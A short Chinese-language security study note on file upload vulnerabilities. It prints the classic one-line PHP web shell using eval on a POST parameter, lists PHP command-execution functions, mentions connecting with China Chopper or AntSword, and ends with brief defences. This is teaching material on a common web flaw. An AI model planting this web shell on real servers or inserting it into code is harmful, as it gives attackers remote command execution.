# 文件上传漏洞

> 文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。

**攻击方式/类型** \
主要在于一句话木马的组成方式

```
<?php eval($_POST['cmd']);?>
↑这就是最简单的一句话木马
其中的$_POST可以替换为$_GET或者$_REQUEST
分别代表POST传参 GET传参 两者皆可
eval是命令执行函数
其余的分别有：
eval()：将字符串作为 PHP 代码执行。
system()：执行系统命令并返回输出。
exec()：执行外部命令。
shell_exec()：执行 shell 命令并返回输出。
passthru()：执行外部命令并将原始输出发送到输出。
popen()：打开进程文件指针。
proc_open()：执行命令并打开进程文件指针。
```

随后把包含该内容的php文件上传至服务器 利用中国菜刀 蚁剑等软件连接即可

**防御方式** \
检查文件类型 检查文件大小 传文件后更改文件名称 对文件内容进行检查与过滤

